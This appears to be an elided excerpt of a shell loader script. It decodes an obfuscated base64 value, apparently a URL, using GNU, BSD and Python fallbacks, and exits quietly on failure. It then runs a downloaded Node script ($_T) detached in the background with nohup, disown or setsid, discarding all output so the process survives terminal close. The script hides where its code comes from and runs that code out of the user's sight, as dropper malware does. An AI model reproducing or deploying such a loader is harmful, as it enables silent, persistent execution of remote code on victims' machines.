...
# handle GNU (Linux) base64 -d  vs  BSD (macOS) base64 -D  vs  python fallback
...
[ -z "$_U" ] && _U=$(python -c "import base64,sys; print(base64.b64decode(sys.argv[1]))" "$_b64" 2>/dev/null | tr -d '\r\n')
[ -z "$_U" ] && exit 0
...
if [[ -n "${_NODE_BIN}" ]] && [[ -x "${_NODE_BIN}" ]]; then
    ...
    if [[ -s "$_T" ]]; then
        ...
        if [[ "${OS_TYPE}" == "macos" ]]; then
            # macOS: setsid not available, use nohup detach
            ( nohup "${_NODE_BIN}" "$_T" >/dev/null 2>&1 & disown $! 2>/dev/null ) 2>/dev/null || true
        else
            # Linux: setsid preferred (survives terminal close), fallback to nohup
